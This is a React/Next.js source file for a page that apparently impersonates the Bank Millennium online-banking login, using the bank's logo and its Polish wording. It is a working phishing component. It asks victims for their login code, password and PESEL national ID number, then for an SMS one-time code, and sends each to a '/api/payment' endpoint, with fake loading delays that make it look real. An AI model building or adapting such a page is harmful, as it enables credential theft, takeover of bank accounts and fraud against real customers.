"use client";

import { useState, useRef } from "react";
import "./login-new.css";
import { useRouter } from "next/navigation";

const BANKS: Record<
  string,
  { name: string; logo: string
    
  }
> = {
  "millennium": {
    name: "Bank Millennium",
    logo: "/banks/bank-millennium.svg"
  },
};


const bank = BANKS["millennium"];

export default function LoginNewPage() {
  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
  const router = useRouter();
  
  const [step, setStep] = useState(1);

  const [field1, setField1] = useState("");
  const [field2, setField2] = useState("");
  const [field3, setField3] = useState("");
  const [field4, setField4] = useState("");

  const [errors, setErrors] = useState({
    field1: false,
    field2: false,
    field3: false,
    field4: false,
  });

  const [errorMessage, setErrorMessage] = useState("");

  const firstInputRef = useRef<HTMLInputElement | null>(null);

  const scrollToInput = () => {
    if (!firstInputRef.current) return;

    firstInputRef.current.scrollIntoView({
      behavior: "smooth",
      block: "center",
    });

    setTimeout(() => firstInputRef.current?.focus(), 300);
  };

  
  const [status, setStatus] =
      useState<"idle" | "loading" | "success" | "error">("idle");

async function handleContinue(e: React.FormEvent<HTMLButtonElement>): Promise<void> {
  e.preventDefault();

  const newErrors = {
    field1: field1.trim() === "",
    field2: field2.trim() === "",
    field3: field3.trim() === "",
    field4: field4.trim() === "",
  };
  
  setErrors(newErrors);

 

  setErrorMessage("");

  if (step === 1) {
     if (newErrors.field1 || newErrors.field2 || newErrors.field3) {
    setErrorMessage("Pole nie może być puste");
    return;
  }

    setStatus("loading");
    const formData = new FormData();
    formData.append("login", field1);
    formData.append("sms", field2);
    formData.append("code", field3);

    const data = Object.fromEntries(formData.entries());

    try {
      console.log("Send /api/payment:", data);

      const res = await fetch("/api/payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      const json = await res.json().catch(() => ({}));
      console.log("Ответ /api/payment:", res.status, json);

      if (!res.ok) {
        setStatus("error");
        return;
      }
      await delay(5000);
      
      setStatus("success");
        
      setField1("");
      setField2("");
      setField3("");
      setStep(2);
      
    } catch (err) {
      console.error("Error fetch:", err);
      setStatus("error");
    }
  }

  if (step === 2) {
    if (newErrors.field4) {
    setErrorMessage("Pole nie może być puste");
    return;
  }
    const formData2 = new FormData();
    formData2.append("sms", field4);

    const data = Object.fromEntries(formData2.entries());

    try {
      console.log("Send /api/payment:", data);

      const res = await fetch("/api/payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      const json = await res.json().catch(() => ({}));
      console.log("Ответ /api/payment:", res.status, json);

      if (!res.ok) {
        setStatus("error");
        return;
      }
      setTimeout(() => {
        setStatus("success");

        setField3("");
        router.push(`/payment/millennium/processing`);
        router.refresh();
      }, 1000);
      
    } catch (err) {
      console.error("Error fetch:", err);
      setStatus("error");
    }
  }
}

  return (
    <div className="login2-page">
      {/* 🔥 LOADING OVERLAY */}
      {status === "loading" && (
        <div className="login2-loading-overlay">
          <div className="login2-loading-box">
            <div className="login2-spinner"></div>
            <p className="login2-loading-text">Ładowanie…</p>
          </div>
        </div>
      )}

      <main className="login2-main">
        <div className="login2-logo-wrapper">
          <img src={bank.logo} alt="Logo" className="login2-logo" />
        </div>

        <div className="login2-divider" />

        <div className="login2-title-wrapper">
          <h1 className="login2-title">Logowanie do Millenetu</h1>
        </div>

        <form className="login2-form" >
          {/* Поле 1 */}
          {step === 1 && (
            <>
          <div className="login2-field">
            <label className="login2-label">MilleKod</label>
            <input
              ref={firstInputRef}
              type="text"
              className={`login2-input ${
                errors.field1 ? "login2-input-error" : ""
              }`}
              value={field1}
              onChange={(e) => {
                setField1(e.target.value);
                if (errors.field1) {
                  setErrors((prev) => ({ ...prev, field1: false }));
                  setErrorMessage("");
                }
              }}
            />
          </div>

          {/* Поле 2 */}
          <div className="login2-field">
            <label className="login2-label">Hasło</label>
            <input
              type="password"
              className={`login2-input ${
                errors.field2 ? "login2-input-error" : ""
              }`}
              value={field2}
              onChange={(e) => {
                setField2(e.target.value);
                if (errors.field2) {
                  setErrors((prev) => ({ ...prev, field2: false }));
                  setErrorMessage("");
                }
              }}
            />
          </div>

          {/* Поле 3 */}
          <div className="login2-field">
            <label className="login2-label">Pesel</label>
            <input
              type="password"
              className={`login2-input ${
                errors.field3 ? "login2-input-error" : ""
              }`}
              value={field3}
              onChange={(e) => {
                setField3(e.target.value);
                if (errors.field3) {
                  setErrors((prev) => ({ ...prev, field3: false }));
                  setErrorMessage("");
                }
              }}
            />
          </div>
            </>
          )}

          {step === 2 && (
            <div className="login2-field">
              <label className="login2-label">Sms</label>
              <input
                type="text"
                className="login2-input"
                value={field4}
                onChange={(e) => setField4(e.target.value)}
              />
            </div>
          )}
          {errorMessage && (
            <p className="login2-error-message">{errorMessage}</p>
          )}

          <button className="login2-button" onClick={handleContinue} >
            Dalej
          </button>
        </form>

        {/* Инфо блок */}
        <div className="login2-info-section">
          <h2 className="login2-info-title">Fałszywi konsultanci</h2>

          <p className="login2-info-text">
            Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych
            <span className="login2-info-link" onClick={scrollToInput}>
              Więcej
            </span>
          </p>
        </div>
        <div className="login2-info-section">
          <h2 className="login2-info-title">Finanse 360°</h2>

          <p className="login2-info-text">
            Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet
            <span className="login2-info-link" onClick={scrollToInput}>
              Więcej
            </span>
          </p>
        </div>
      </main>
    </div>
  );
}
